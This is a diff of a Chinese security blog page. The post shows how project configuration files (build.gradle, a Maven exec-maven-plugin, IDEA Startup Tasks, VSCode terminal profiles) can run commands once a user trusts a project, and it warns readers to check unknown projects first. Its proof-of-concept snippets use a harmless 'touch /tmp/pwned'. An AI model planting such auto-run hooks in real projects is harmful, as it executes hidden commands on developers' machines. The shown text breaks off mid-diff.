@@ -2,82 +2,82 @@
 "><meta property="og:image" content><meta property="og:title" content="利用项目配置文件进行 RCE - IDE Trust Project 功能探究"><meta property="og:description" content="最近发现在打开 IDEA, VSCode 项目时候, 都增加了 &ldquo;信任此项目的提示&rdquo;. 结合这些 IDE 的特点, 确实可能存在在打开项目时产生 RCE 的风险, 特别是进行代码审计的安全人员, 会经常打开未知的项目. 正常人肯定不会贸然的执行未知的代码, 但是对于打开项目时这个弹出的框框, 可能并不会特别在意. 接下来分析一些通过这些配置来进行 RCE 的方法.
 "><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2021/10/02/%E5%88%A9%E7%94%A8%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C-RCE-IDE-Trust-Project-%E5%8A%9F%E8%83%BD%E6%8E%A2%E7%A9%B6/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-10-02T20:43:33+00:00"><meta property="article:modified_time" content="2021-10-02T20:43:33+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="利用项目配置文件进行 RCE - IDE Trust Project 功能探究"><meta name=twitter:description content="最近发现在打开 IDEA, VSCode 项目时候, 都增加了 &ldquo;信任此项目的提示&rdquo;. 结合这些 IDE 的特点, 确实可能存在在打开项目时产生 RCE 的风险, 特别是进行代码审计的安全人员, 会经常打开未知的项目. 正常人肯定不会贸然的执行未知的代码, 但是对于打开项目时这个弹出的框框, 可能并不会特别在意. 接下来分析一些通过这些配置来进行 RCE 的方法.
 "><script src=https://rmb122.com/js/feather.min.js></script>
-<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.adee9cfbd354daaeb33dace537964a63d82b2251776e6faa9b2b77ed0860ce11.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.edf79541ec4ce8eb7c41e94c73563068c3e0a2637547bb1abb19618cb525a38d.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
+<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.44723f0f128be8581db7d2296d67fc2ff9ac8798b7ab31fed9c48fabd3c611d2.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.1690097eb84906d3c2f59ea4d255ed949c48a3fcef56a7482d95a745048a8661.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
 <a href=/posts>归档</a>&nbsp;
 <a href=/tags>标签</a>&nbsp;
 <a href=/links>友链</a>&nbsp;
 <a href=/about>关于</a>
 | <a id=dark-mode-toggle onclick=toggleTheme() href></a>
-<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>利用项目配置文件进行 RCE - IDE Trust Project 功能探究</h1><div class=meta>发表于 2021 年 10 月 2 日</div></div><section class=body><p>最近发现在打开 IDEA, VSCode 项目时候, 都增加了 &ldquo;信任此项目的提示&rdquo;. 结合这些 IDE 的特点, 确实可能存在在打开项目时产生 RCE 的风险, 特别是进行代码审计的安全人员, 会经常打开未知的项目. 正常人肯定不会贸然的执行未知的代码, 但是对于打开项目时这个弹出的框框, 可能并不会特别在意. 接下来分析一些通过这些配置来进行 RCE 的方法.</p><p><img src=https://i.loli.net/2021/10/02/ToPQhtryzgDUdCs.png alt></p><h2 id=idea>IDEA</h2><h3 id=gradle>Gradle</h3><p>最先想到的是 java 项目常用的构建工具 gradle. 它的 build 方式不同于 maven 的那种声明式 xml, 而是通过运行一个 build.gradle 脚本, 类似于 python 安装模块时的 setup.py. 我们自然可以通过编写恶意的 build.gradle 脚本来达到 RCE 的目的, 示例如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gradle data-lang=gradle><span style=display:flex><span>plugins <span style=color:#ff79c6>{</span>
-</span></span><span style=display:flex><span>    id <span style=color:#f1fa8c>&#39;java&#39;</span>
-</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>group <span style=color:#f1fa8c>&#39;org.example&#39;</span>
-</span></span><span style=display:flex><span>version <span style=color:#f1fa8c>&#39;1.0-SNAPSHOT&#39;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>exec <span style=color:#ff79c6>{</span>
-</span></span><span style=display:flex><span>    commandLine <span style=color:#f1fa8c>&#39;touch&#39;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#39;/tmp/pwned&#39;</span>
-</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>repositories <span style=color:#ff79c6>{</span>
-</span></span><span style=display:flex><span>    mavenCentral<span style=color:#ff79c6>()</span>
-</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>dependencies <span style=color:#ff79c6>{</span>
-</span></span><span style=display:flex><span>    testImplementation <span style=color:#f1fa8c>&#39;org.junit.jupiter:junit-jupiter-api:5.7.0&#39;</span>
-</span></span><span style=display:flex><span>    testRuntimeOnly <span style=color:#f1fa8c>&#39;org.junit.jupiter:junit-jupiter-engine:5.7.0&#39;</span>
-</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>test <span style=color:#ff79c6>{</span>
-</span></span><span style=display:flex><span>    useJUnitPlatform<span style=color:#ff79c6>()</span>
-</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
-</span></span></code></pre></div><p>其中</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>exec {
-</span></span><span style=display:flex><span>    commandLine &#39;touch&#39;, &#39;/tmp/pwned&#39;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>即是 RCE 的部分, 非常的简单直接<br>如果打开 Safe Mode, 是不会运行 build.gradle 的, 保证了用户的安全, 但是如果信任了这个项目, IDEA 就会自动运行 build.gradle</p><h3 id=maven>Maven</h3><p>maven 在经过测试后, 似乎 IDEA 并没有真正的运行 <code>mvn</code> 命令, 在用户 0-click 的情况下, 似乎只是解析了 pom.xml, 然后下载依赖, 分析 main class, 并没有真正进行 maven 的 lifecycle<br>但是如果目标会进行 mvn package 等操作, 我们可以通过 mvn plugin 插件达到 RCE 的目的.</p><p>一个示例如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;plugins&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;plugin&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;artifactId&gt;</span>exec-maven-plugin<span style=color:#ff79c6>&lt;/artifactId&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;version&gt;</span>3.0.0<span style=color:#ff79c6>&lt;/version&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;groupId&gt;</span>org.codehaus.mojo<span style=color:#ff79c6>&lt;/groupId&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;executions&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;execution&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;id&gt;</span>exec<span style=color:#ff79c6>&lt;/id&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;phase&gt;</span>validate<span style=color:#ff79c6>&lt;/phase&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;goals&gt;</span>
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;goal&gt;</span>exec<span style=color:#ff79c6>&lt;/goal&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;/goals&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;/execution&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;/executions&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;configuration&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;executable&gt;</span>touch<span style=color:#ff79c6>&lt;/executable&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;arguments&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;argument&gt;</span>/tmp/pwned<span style=color:#ff79c6>&lt;/argument&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;/arguments&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;/configuration&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;/plugin&gt;</span>
-</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/plugins&gt;</span>
-</span></span></code></pre></div><p><code>exec-maven-plugin</code> 是一个现成的执行命令的 mvn plugin, 我们将其制定在 mvn phase = validate 时执行, 这样在目标进行 package 时就会执行 <code>touch /tmp/pwned</code> (一个可能受害的场景是打包成 jar 然后复制到 docker 里面运行)</p><h3 id=idea-本身>IDEA 本身</h3><p>除了这些常用的 build 工具, IDEA 本身也自带一个 <code>Startup Task</code> 功能, 在 <code>Tools -> Startup Task</code> 中可以找到, 我们可以自己添加一个 Shell Script 任务. 这些配置会保存在 <code>.idea/workspace.xml</code> 中, 并且这个利用方式应该可以给 Jetbrains 全家桶来使用, 会在项目打开时自动运行</p><p><img src=https://i.loli.net/2021/10/02/51Hy7hcepfXiGgC.png alt></p><h2 id=vscode>VSCode</h2><p>VSCode 本身功能较少, 大部分功能其实靠插件来实现, 所以我找到最泛用的是替换默认的 Shell 选项, 在 <code>.vscode/settings.json</code> 中添加</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;terminal.integrated.defaultProfile.linux&#34;</span>: <span style=color:#f1fa8c>&#34;bash&#34;</span>,
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&#34;terminal.integrated.profiles.linux&#34;</span>: {
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;bash&#34;</span>: {
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;path&#34;</span>: <span style=color:#f1fa8c>&#34;bash&#34;</span>,
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;icon&#34;</span>: <span style=color:#f1fa8c>&#34;terminal-bash&#34;</span>,
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;args&#34;</span>: [<span style=color:#f1fa8c>&#34;-c&#34;</span>, <span style=color:#f1fa8c>&#34;touch /tmp/pwned; bash&#34;</span>]
-</span></span><span style=display:flex><span>        },
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;zsh&#34;</span>: {
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;path&#34;</span>: <span style=color:#f1fa8c>&#34;zsh&#34;</span>,
-</span></span><span style=display:flex><span>        },
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;fish&#34;</span>: {
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;path&#34;</span>: <span style=color:#f1fa8c>&#34;fish&#34;</span>
-</span></span><span style=display:flex><span>        },
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;tmux&#34;</span>: {
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;path&#34;</span>: <span style=color:#f1fa8c>&#34;tmux&#34;</span>,
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;icon&#34;</span>: <span style=color:#f1fa8c>&#34;terminal-tmux&#34;</span>
-</span></span><span style=display:flex><span>        },
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&#34;pwsh&#34;</span>: {
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;path&#34;</span>: <span style=color:#f1fa8c>&#34;pwsh&#34;</span>,
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&#34;icon&#34;</span>: <span style=color:#f1fa8c>&#34;terminal-powershell&#34;</span>
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>这样打开 vscode 的终端时, 就会无感执行命令</p><h2 id=总结>总结</h2><p>最后, 这些 IDE 丰富的功能确实留下来非常多的攻击面, 对陌生的项目最好好看看再进行 <code>Trust</code>. 不然漏洞还没找到, 自己先被对方反杀了.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/misc>misc</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>
+<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>利用项目配置文件进行 RCE - IDE Trust Project 功能探究</h1><div class=meta>发表于 2021 年 10 月 2 日</div></div><section class=body><p>最近发现在打开 IDEA, VSCode 项目时候, 都增加了 &ldquo;信任此项目的提示&rdquo;. 结合这些 IDE 的特点, 确实可能存在在打开项目时产生 RCE 的风险, 特别是进行代码审计的安全人员, 会经常打开未知的项目. 正常人肯定不会贸然的执行未知的代码, 但是对于打开项目时这个弹出的框框, 可能并不会特别在意. 接下来分析一些通过这些配置来进行 RCE 的方法.</p><p><img src=https://i.loli.net/2021/10/02/ToPQhtryzgDUdCs.png alt></p><h2 id=idea>IDEA</h2><h3 id=gradle>Gradle</h3><p>最先想到的是 java 项目常用的构建工具 gradle. 它的 build 方式不同于 maven 的那种声明式 xml, 而是通过运行一个 build.gradle 脚本, 类似于 python 安装模块时的 setup.py. 我们自然可以通过编写恶意的 build.gradle 脚本来达到 RCE 的目的, 示例如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gradle data-lang=gradle><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>plugins <span style=color:#ff79c6>{</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    id <span style=color:#f1fa8c>&#39;java&#39;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff79c6>}</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>group <span style=color:#f1fa8c>&#39;org.example&#39;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>version <span style=color:#f1fa8c>&#39;1.0-SNAPSHOT&#39;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>exec <span style=color:#ff79c6>{</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    commandLine <span style=color:#f1fa8c>&#39;touch&#39;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#39;/tmp/pwned&#39;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#ff79c6>}</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>repositories <span style=color:#ff79c6>{</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    mavenCentral<span style=color:#ff79c6>()</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#ff79c6>}</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>dependencies <span style=color:#ff79c6>{</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    testImplementation <span style=color:#f1fa8c>&#39;org.junit.jupiter:junit-jupiter-api:5.7.0&#39;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>    testRuntimeOnly <span style=color:#f1fa8c>&#39;org.junit.jupiter:junit-jupiter-engine:5.7.0&#39;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#ff79c6>}</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>test <span style=color:#ff79c6>{</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    useJUnitPlatform<span style=color:#ff79c6>()</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#ff79c6>}</span>
+</span></span></code></pre></div><p>其中</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>exec {
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    commandLine &#39;touch&#39;, &#39;/tmp/pwned&#39;
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>}
+</span></span></code></pre></div><p>即是 RCE 的部分, 非常的简单直接<br>如果打开 Safe Mode, 是不会运行 build.gradle 的, 保证了用户的安全, 但是如果信任了这个项目, IDEA 就会自动运行 build.gradle</p><h3 id=maven>Maven</h3><p>maven 在经过测试后, 似乎 IDEA 并没有真正的运行 <code>mvn</code> 命令, 在用户 0-click 的情况下, 似乎只是解析了 pom.xml, 然后下载依赖, 分析 main class, 并没有真正进行 maven 的 lifecycle<br>但是如果目标会进行 mvn package 等操作, 我们可以通过 mvn plugin 插件达到 RCE 的目的.</p><p>一个示例如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>&lt;plugins&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#ff79c6>&lt;plugin&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    <span style=color:#ff79c6>&lt;artifactId&gt;</span>exec-maven-plugin<span style=color:#ff79c6>&lt;/artifactId&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    <span style=color:#ff79c6>&lt;version&gt;</span>3.0.0<span style=color:#ff79c6>&lt;/version&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#ff79c6>&lt;groupId&gt;</span>org.codehaus.mojo<span style=color:#ff79c6>&lt;/groupId&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#ff79c6>&lt;executions&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        <span style=color:#ff79c6>&lt;execution&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        <span style=color:#ff79c6>&lt;id&gt;</span>exec<span style=color:#ff79c6>&lt;/id&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#ff79c6>&lt;phase&gt;</span>validate<span style=color:#ff79c6>&lt;/phase&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>        <span style=color:#ff79c6>&lt;goals&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>            <span style=color:#ff79c6>&lt;goal&gt;</span>exec<span style=color:#ff79c6>&lt;/goal&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        <span style=color:#ff79c6>&lt;/goals&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        <span style=color:#ff79c6>&lt;/execution&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff79c6>&lt;/executions&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#ff79c6>&lt;configuration&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>        <span style=color:#ff79c6>&lt;executable&gt;</span>touch<span style=color:#ff79c6>&lt;/executable&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>        <span style=color:#ff79c6>&lt;arguments&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        <span style=color:#ff79c6>&lt;argument&gt;</span>/tmp/pwned<span style=color:#ff79c6>&lt;/argument&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>        <span style=color:#ff79c6>&lt;/arguments&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    <span style=color:#ff79c6>&lt;/configuration&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#ff79c6>&lt;/plugin&gt;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#ff79c6>&lt;/plugins&gt;</span>
+</span></span></code></pre></div><p><code>exec-maven-plugin</code> 是一个现成的执行命令的 mvn plugin, 我们将其制定在 mvn phase = validate 时执行, 这样在目标进行 package 时就会执行 <code>touch /tmp/pwned</code> (一个可能受害的场景是打包成 jar 然后复制到 docker 里面运行)</p><h3 id=idea-本身>IDEA 本身</h3><p>除了这些常用的 build 工具, IDEA 本身也自带一个 <code>Startup Task</code> 功能, 在 <code>Tools -> Startup Task</code> 中可以找到, 我们可以自己添加一个 Shell Script 任务. 这些配置会保存在 <code>.idea/workspace.xml</code> 中, 并且这个利用方式应该可以给 Jetbrains 全家桶来使用, 会在项目打开时自动运行</p><p><img src=https://i.loli.net/2021/10/02/51Hy7hcepfXiGgC.png alt></p><h2 id=vscode>VSCode</h2><p>VSCode 本身功能较少, 大部分功能其实靠插件来实现, 所以我找到最泛用的是替换默认的 Shell 选项, 在 <code>.vscode/settings.json</code> 中添加</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>{
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#ff79c6>&#34;terminal.integrated.defaultProfile.linux&#34;</span>: <span style=color:#f1fa8c>&#34;bash&#34;</span>,
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    <span style=color:#ff79c6>&#34;terminal.integrated.profiles.linux&#34;</span>: {
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>        <span style=color:#ff79c6>&#34;bash&#34;</span>: {
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>            <span style=color:#ff79c6>&#34;path&#34;</span>: <span style=color:#f1fa8c>&#34;bash&#34;</span>,
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>            <span style=color:#ff79c6>&#34;icon&#34;</span>: <span style=color:#f1fa8c>&#34;terminal-bash&#34;</span>,
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>            <span style=color:#ff79c6>&#34;args&#34;</span>: [<span style=color:#f1fa8c>&#34;-c&#34;</span>, <span style=color:#f1fa8c>&#34;touch /tmp/pwned; bash&#34;</span>]
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        },
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#ff79c6>&#34;zsh&#34;</span>: {
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            <span style=color:#ff79c6>&#34;path&#34;</span>: <span style=color:#f1fa8c>&#34;zsh&#34;</span>,
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        },
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        <span style=color:#ff79c6>&#34;fish&#34;</span>: {
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>            <span style=color:#ff79c6>&#34;path&#34;</span>: <span style=color:#f1fa8c>&#34;fish&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        },
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        <span style=color:#ff79c6>&#34;tmux&#34;</span>: {
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>            <span style=color:#ff79c6>&#34;path&#34;</span>: <span style=color:#f1fa8c>&#34;tmux&#34;</span>,
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            <span style=color:#ff79c6>&#34;icon&#34;</span>: <span style=color:#f1fa8c>&#34;terminal-tmux&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        },
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>        <span style=color:#ff79c6>&#34;pwsh&#34;</span>: {
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>            <span style=color:#ff79c6>&#34;path&#34;</span>: <span style=color:#f1fa8c>&#34;pwsh&#34;</span>,
